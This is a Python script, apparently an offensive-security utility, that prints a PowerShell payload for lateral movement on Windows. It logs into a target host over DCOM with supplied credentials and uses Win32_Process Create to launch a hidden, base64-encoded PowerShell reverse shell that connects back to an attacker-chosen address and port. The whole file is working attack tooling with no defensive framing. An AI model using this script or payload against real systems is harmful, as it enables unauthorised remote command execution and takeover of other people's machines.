#!/usr/bin/python3
import argparse
import base64
from textwrap import dedent
from shells import Shells

POSTAMBLE = (
    "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process "
    "-MethodName Create -Arguments @{CommandLine =$Command};"
)

def main():
    parser = argparse.ArgumentParser(
        description="Print a PowerShell wrapper holding a base64-encoded reverse shell."
    )
    parser.add_argument("-username", required=True, help="Username for PSCredential")
    parser.add_argument("-password", required=True, help="Password for PSCredential")
    parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")
    parser.add_argument("-listen_address", required=True, help="IP address to connect back to")
    parser.add_argument("-listen_port", required=True, type=int, help="Port to connect back on")

    args = parser.parse_args()

    # Build PREAMBLE dynamically from args
    preamble = dedent(f"""\
    $username = '{args.username}';
    $password = '{args.password}';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $Options = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName {args.target_ip} -Credential $credential -SessionOption $Options
    """)

    encoded = Shells.encode_ps_for_e(args.listen_address, args.listen_port)
    command_line = "powershell -nop -w hidden -e " + encoded

    # Print exactly in the order requested
    print(preamble, end="" if preamble.endswith("\n") else "\n")
    print(f"\n$Command = '{command_line}';\n")
    print(POSTAMBLE)

if __name__ == "__main__":
    main()
